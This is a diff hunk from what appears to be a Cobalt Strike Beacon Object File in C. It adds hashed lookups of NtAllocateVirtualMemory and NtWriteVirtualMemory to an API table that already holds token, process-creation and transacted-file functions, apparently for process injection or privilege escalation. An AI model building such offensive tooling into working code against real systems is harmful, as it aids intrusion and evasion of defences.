@@ -96,12 +96,14 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		ApiTbl.SetSecurityDescriptorDacl    = PeGetFuncEat( AdvMod, H_API_SETSECURITYDESCRIPTORDACL );
 		ApiTbl.NtCreateDirectoryObjectEx    = PeGetFuncEat( NtlMod, H_API_NTCREATEDIRECTORYOBJECTEX );
 		ApiTbl.NtQuerySystemInformation     = PeGetFuncEat( NtlMod, H_API_NTQUERYSYSTEMINFORMATION );
+		ApiTbl.NtAllocateVirtualMemory      = PeGetFuncEat( NtlMod, H_API_NTALLOCATEVIRTUALMEMORY );
 		ApiTbl.SetKernelObjectSecurity      = PeGetFuncEat( AdvMod, H_API_SETKERNELOBJECTSECURITY );
 		ApiTbl.NtQueryInformationToken      = PeGetFuncEat( NtlMod, H_API_NTQUERYINFORMATIONTOKEN );
 		ApiTbl.CreateProcessWithTokenW      = PeGetFuncEat( AdvMod, H_API_CREATEPROCESSWITHTOKENW );
 		ApiTbl.ConvertStringSidToSidA       = PeGetFuncEat( AdvMod, H_API_CONVERTSTRINGSIDTOSIDA );
 		ApiTbl.CreateFileTransactedW        = PeGetFuncEat( K32Mod, H_API_CREATEFILETRANSACTEDW );
 		ApiTbl.NtWaitForSingleObject        = PeGetFuncEat( NtlMod, H_API_NTWAITFORSINGLEOBJECT );
+		ApiTbl.NtWriteVirtualMemory         = PeGetFuncEat( NtlMod, H_API_NTWRITEVIRTUALMEMORY );
 		ApiTbl.RtlInitUnicodeString         = PeGetFuncEat( NtlMod, H_API_RTLINITUNICODESTRING );
 		ApiTbl.NtCreateTransaction          = PeGetFuncEat( NtlMod, H_API_NTCREATETRANSACTION );
 		ApiTbl.NtReadVirtualMemory          = PeGetFuncEat( NtlMod, H_API_NTREADVIRTUALMEMORY );
